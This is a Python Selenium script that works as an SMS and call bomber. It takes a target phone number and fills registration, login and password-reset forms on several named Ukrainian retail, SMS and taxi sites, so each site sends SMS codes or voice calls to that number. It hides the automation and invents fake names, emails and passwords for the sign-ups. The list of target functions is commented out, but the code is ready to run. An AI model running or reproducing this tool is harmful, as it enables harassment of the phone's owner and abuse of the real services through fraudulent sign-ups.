import random
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
import time
from faker import Faker

fake = Faker()
options = Options()
options.add_argument("--headless")
options.add_argument("--enable-unsafe-swiftshader")
options.add_argument("start-maximized")
options.add_argument("--disable-gpu")
options.add_argument("--no-sandbox")
options.add_argument("--disable-extensions")
options.add_argument("--disable-infobars")
options.add_argument("--disable-logging")
options.add_argument("--disable-blink-features=AutomationControlled")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--disable-background-networking") 
options.add_argument("--disable-background-timer-throttling")
options.add_argument("--disable-backgrounding-occluded-windows")
options.add_argument("--disable-renderer-backgrounding")
options.add_argument("--enable-features=NetworkService,NetworkServiceInProcess")
options.add_argument("--disable-features=TranslateUI") 
options.add_argument("--log-level=1")
options.add_argument(f"--user-agent={fake.user_agent()}")
options.add_experimental_option("excludeSwitches", ["enable-automation"])
options.add_experimental_option('useAutomationExtension', False)

driver = webdriver.Chrome(options=options)
driver.get("about:blank")
wait = WebDriverWait(driver, 10)

kirill = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def try_decorator(func):
    def wrapper(*args, **kwargs):
        try:
            func()
            return True
        except: return False
        # finally: driver.close()
    wrapper.__doc__ = func.__doc__
    return wrapper

def find_xpath(xpath, wait=wait, clickable=False):
    if clickable:
        return wait.until(EC.element_to_be_clickable((By.XPATH, f"{xpath}")))
    else:
        return wait.until(EC.visibility_of_element_located((By.XPATH, f"{xpath}")))

@try_decorator
def allo():
    """Попытка регистрации/входа в Алло (Allo) - allo.ua"""
    driver.get("https://allo.ua/")
    try:
        open_form = find_xpath("//div[@class='mh-profile']")
        open_form.click()

        phone_field = find_xpath("//input[@placeholder='Введіть номер телефону']")
        phone_field.send_keys(raw_number[3:], Keys.ENTER)
    except: return 
    name_field = find_xpath("//input[@name='firstname']")
    name_field.send_keys(name, Keys.ENTER)
    
@try_decorator
def epicentr_register():
    """Попытка регистрации в Эпицентре К (epicentrk) - epicentrk.ua"""
    driver.get("https://epicentrk.ua/")

    open_form = find_xpath("//div[@class='header__login-opener']")
    open_form.click()
    

    register_button = find_xpath("//li[text()='Реєстрація']")
    register_button.click()
    

    surname_field = find_xpath("//input[@placeholder='Введіть ваше прізвище']")
    surname_field.send_keys(surname)
    

    name_field = find_xpath("(//input[@type='text'])[3]")
    name_field.send_keys(name)
    

    phone_field = find_xpath("(//input[@type='tel'])[2]")
    phone_field.send_keys(raw_number[3:])

    email_field = find_xpath("//input[@type='email' and @placeholder='user@example.com']")
    email_field.send_keys(email)


    for i in range(2, 4):
        password_field = find_xpath(f"(//input[@type='password'])[{i}]")
        print(password_field)
        password_field.send_keys(password)
    
    register_button = find_xpath("//button[@type='button' and @data-auth-type='registration']")
    register_button.click()

@try_decorator
def epicentr_reset_password():
    """Попытка восстановления пароля в Эпицентре К (epicentrk) - epicentrk.ua"""
    driver.get("https://epicentrk.ua/")

    open_form = find_xpath("//div[@class='header__login-opener']")
    open_form.click()

    reset_button = find_xpath("//span[@class='c7xI']")
    reset_button.click()

    phone_field = find_xpath("(//input[@name='login'])[2]")
    phone_field.send_keys(raw_number[3:])

    continue_button = find_xpath("//button[text()='Продовжити']")
    continue_button.click()

@try_decorator
def bi_register():
    """Попытка регистрации в Доме Игрушек (BI) - bi.ua"""
    driver.get("https://bi.ua/ukr/signup/")

    name_field = find_xpath("//input[@id='name']")
    name_field.send_keys(kirill_name)

    phone_field = find_xpath("//input[@id='emailPhone']")
    phone_field.send_keys(raw_number)

    continue_button = find_xpath("//input[@value='Далі']")
    continue_button.click()

@try_decorator
def bi_reset_password():
    """Попытка восстановления пароля в Доме Игрушек (BI) - bi.ua"""
    driver.get("https://bi.ua/ukr/login/")

    phone_field = find_xpath("//input[@id='emailPhone']")
    phone_field.send_keys(raw_number)

    continue_button = find_xpath("//input[@value='Далі']")
    continue_button.click()

@try_decorator
def alphasms_register():
    """Попытка регистрации в АльфаСМС (AlphaSMS) - alphasms.ua"""
    driver.get("https://alphasms.ua/panel/sign-up/")

    name_field = find_xpath("//input[@name='name']")
    name_field.send_keys(kirill_name)

    phone_field = find_xpath("//input[@name='phone']")
    phone_field.send_keys(no_country_code_number)

    password_field = find_xpath("//input[@name='password']")
    password_field.send_keys(password)

    company_field = find_xpath("//input[@name='company']")
    company_field.send_keys(name)

    email_field = find_xpath("//input[@name='email']")
    email_field.send_keys(email)

    submit_button = find_xpath("//button[@type='submit']")
    submit_button.click()

@try_decorator
def alphasms_reset_password():
    """Попытка восстановления пароля в АльфаСМС (AlphaSMS) - alphasms.ua"""
    driver.get("https://alphasms.ua/panel/recover/")

    phone_field = find_xpath("//input[@name='phone']")
    phone_field.send_keys(no_country_code_number)

    submit_button = find_xpath("//button[@type='submit']")
    submit_button.click()

    driver.implicitly_wait(10)

@try_decorator
def zolotakoroleva_reset_password():
    """Попытка восстановления пароля в Золотой Королеве (Zolota Koroleva) - zolotakoroleva.ua"""
    driver.get("https://zolotakoroleva.ua/sign-in")

    phone_field = find_xpath("//input[@name='login']")
    phone_field.send_keys(formatted_number)

    reset_password = find_xpath("//a[@data-tid='forgot-password-link']")
    reset_password.click()

    submit_button = find_xpath("//button[@data-tid='forgot-password-link']")
    submit_button.click()

@try_decorator
def eva():
    """Попытка регистрации/входа в Еве (Eva) - eva.ua"""
    driver.get("https://eva.ua/ua/")
    
    open_menu = find_xpath("//span[@class='icon ico-user-clear']")
    open_menu.click()
    
    open_menu = find_xpath("//button[@class='sf-button m-profile-login__btn no-style']")
    open_menu.click()

    phone_field = find_xpath("//input[@name='phone']")
    phone_field.send_keys(no_country_code_number)
    
    submit_button = find_xpath("//button[@class='sf-button sf-button color-primary']")
    submit_button.click()

    find_xpath("//div[@class='modal__container modal__container--mobile-full']")

@try_decorator
def taximaxim_sms():
    """Попытка регистрации в Такси Максим (taximaxim) - taximaxim.com.ua"""
    driver.get("https://client.taximaxim.com.ua/uk-UA/login/")

    phone_field = find_xpath("//input[@type='tel']")
    phone_field.send_keys(short_number, Keys.ENTER)

@try_decorator
def taximaxim_ivr():
    """Попытка регистрации в Такси Максим (taximaxim) - taximaxim.com.ua"""
    driver.get("https://client.taximaxim.com.ua/uk-UA/login/")

    phone_field = find_xpath("//input[@type='tel']")
    phone_field.send_keys(short_number)
    
    submit_button = find_xpath("(//button[@type='submit' and text()='Продовжити'])[1]", clickable=True)
    submit_button.click()
    driver.implicitly_wait(10)
    
    call_button = find_xpath("(//button[@type='submit'])[2]", clickable=True)
    call_button.click()
    driver.implicitly_wait(10)

@try_decorator
def dnipro():
    """Попытка регистрации/входа в Днипро (Dnipro-M) - dnipro-m.ua"""
    driver.get("https://dnipro-m.ua/")

    open_profile = find_xpath("//button[@aria-label='Вхід/Реєстрація']")
    open_profile.click()

    phone_field = find_xpath("//input[@type='tel' and @name='phone']")
    phone_field.send_keys(short_number)

    find_xpath("//input[@id='code']")

def main():
    global kirill_name
    kirill_name = "".join(random.choice(kirill) for _ in range(10))

    global email
    email = fake.email()

    global password
    password = fake.password()

    global username
    username = fake.user_name()

    global raw_number
    raw_number = input("Вводи вот так XXXXXXXXXXXX\n") # XXXXXXXXXXXX

    global no_country_code_number
    no_country_code_number = raw_number[2:]

    global short_number
    short_number = raw_number[3:]

    global formatted_number
    formatted_number = str("+" + raw_number)

    faker_name = fake.name().split(" ")
    global name 
    name = faker_name[0]
    global surname
    surname = faker_name[1]

    global DD, MM, YYYY
    DD = random.randint(1, 28)
    MM = random.randint(1, 12)
    YYYY = random.randint(1980, 2000) # 25 - 45 years
    
    for func in [
        # allo,
        # epicentr_reset_password,
        # epicentr_register,
        # bi_register,
        # bi_reset_password,
        # alphasms_register,
        # alphasms_reset_password,
        # zolotakoroleva_reset_password,
        # eva,
        # taximaxim_sms,
        # taximaxim_ivr,
        # dnipro
    ]:            
            if func():
                print(bcolors.OKGREEN + f"[+] {func.__doc__}")
            # time.sleep(1)
            else:
                print(bcolors.FAIL + f"[-] {func.__doc__}")

if __name__ == "__main__":
    main()
    print(bcolors.ENDC)